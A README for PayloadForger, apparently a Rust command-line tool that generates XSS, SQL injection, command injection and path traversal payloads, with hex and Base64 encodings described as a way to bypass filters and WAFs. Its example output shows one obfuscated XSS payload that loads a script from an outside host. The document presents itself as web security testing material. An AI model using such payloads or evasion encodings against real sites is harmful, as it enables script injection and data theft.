# PayloadForger

PayloadForger is a tool designed to generate custom payloads for web application security testing. It supports various attack types including XSS, SQL Injection, Command Injection, and Path Traversal. The tool generates payloads based on user input and provides encoded versions in hexadecimal and Base64 formats to help bypass security filters and WAFs.

## Features

Generate payloads for XSS, SQL Injection, Command Injection, and Path Traversal.

Encode payloads in hexadecimal and Base64.

Support for custom payloads with path traversal for more advanced testing.

## Directory Structure

The project has the following directory structure:


project-root/
├── src/
│   ├── attack_types.rs
│   ├── main.rs
│   └── payload.rs
├── payloads/
│   ├── xss.txt
│   ├── sqlinjection.txt
│   ├── commandinjection.txt
│   └── custom.txt
├── Cargo.toml
└── target/

## Requirements

Rust (1.56 or later)
Cargo (Rust package manager)

## Installation

Clone the repository:



git clone https://github.com/CypherHippie/PayloadForger.git
cd payload-forge

## Build the project:



cargo build --reléase

## Run the application:



cargo run -- <payload_type> <attack_type> [custom_payload]

<payload_type>: raw

<attack_type>: xss, sqlinjection, commandinjection, pathtraversal

[custom_payload] (optional): Custom payload path for path traversal

## Usage

To generate a payload, run the application with the desired parameters:

### XSS Payload:


cargo run -- raw xss

### SQL Injection Payload:


cargo run -- raw sqlinjection

### Command Injection Payload:


cargo run -- raw commandinjection


### Path Traversal Payload with Custom Payload:


cargo run -- raw pathtraversal /path/to/custom/payload.txt

### Example Output


Raw: %3Ciframe src='javascript:alert("&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;")'%3E%3C/iframe%3E
Hex: <encoded_hex_value>
Base64: <encoded_base64_value>

## Contributing

Contributions are welcome! If you find a bug or have a feature request, please open an issue or submit a pull request.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

The tool leverages the Rust programming language and its ecosystem for robust and efficient payload generation.

Thanks to the community for their support and contributions.